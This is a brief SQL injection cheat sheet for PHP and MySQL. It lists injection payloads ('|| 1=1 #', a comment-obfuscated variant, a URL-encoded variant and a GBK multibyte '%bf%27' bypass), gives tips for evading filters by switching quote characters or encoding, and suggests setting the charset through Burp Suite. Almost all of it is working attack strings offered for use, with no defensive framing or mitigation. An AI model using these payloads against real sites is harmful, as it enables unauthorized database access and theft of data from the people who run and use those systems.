SQL Injection
-----------------------------
PHP & MYSQL
Note: The characters responsible for injection are either one of the following: ',",`
If one does not work please try the other characters. If none of them work try encoding them to unicode.

' || 1=1 #
'/**/||/**/1=1/**/#
'%27||%271=1%27#

%bf%27 or 1=1 -- (*1)
(*1 Note): Some databases may not have the same charset. You can change the browser 'attribute' option to gbk using burp suite. Ex: attribute="gbk"
